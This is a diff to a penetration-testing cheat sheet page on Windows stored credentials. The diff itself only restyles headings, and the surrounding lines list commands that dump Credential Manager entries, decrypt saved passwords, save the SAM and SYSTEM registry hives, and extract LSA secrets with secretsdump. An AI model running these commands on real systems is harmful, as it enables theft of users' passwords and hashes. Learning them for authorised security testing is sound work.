@@ -1,6 +1,6 @@
 # Stored Credentials
 
-## Commands
+## <mark style="color:red;">Commands</mark>
 
 <table data-header-hidden data-full-width="true"><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><mark style="color:yellow;"><code>cmdkey /list</code></mark></td><td>Lists credentials stored in Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>Get-StoredCredential</code></mark></td><td>Lists credentials stored in Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>Get-StoredCredential -Target "TargetName"</code></mark></td><td>Lists credentials for a specific target in Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>$cred = Get-StoredCredential -Target "TargetName"</code></mark></td><td>Retrieves credentials for a specific target from Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>$cred.GetNetworkCredential().Password</code></mark></td><td>Retrieves and decrypts the password for a specific target from Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>wmic path Win32_VaultCredential</code></mark></td><td>Lists credentials stored in Windows Vault using WMI (may not work on all systems).</td></tr><tr><td><mark style="color:yellow;"><code>reg.exe save hklm\sam C:\temp\sam.save</code></mark></td><td>Copies SAM. The SAM can be decrypted using secretsdump.py from Impacket.</td></tr><tr><td><mark style="color:yellow;"><code>reg.exe save hklm\system C:\temp\system.save</code></mark></td><td>Copies System Registry.</td></tr></tbody></table>
 
@@ -32,7 +32,7 @@ Lists Wi-Fi network profiles and their passwords using PowerShell (requires admi
 ```
 {% endcode %}
 
-## LSA Secrets
+## <mark style="color:red;">LSA Secrets</mark>
 
 LSA Secrets is used by the Local Security Authority (LSA) as storage, and oftentimes information such as auto-login service accounts or VPN credentials may be stored here:
 
@@ -56,7 +56,7 @@ We can then extract the LSA Secrets using secretsdump from Impacket with the com
 python3 secretsdump.py -security security.save -system system.save LOCAL
 ```
 
-## Copy SAM and System Hive
+## <mark style="color:red;">Copy SAM and System Hive</mark>
 
 To backup the SAM and SYSTEM hashes, we can use the following commands:
 
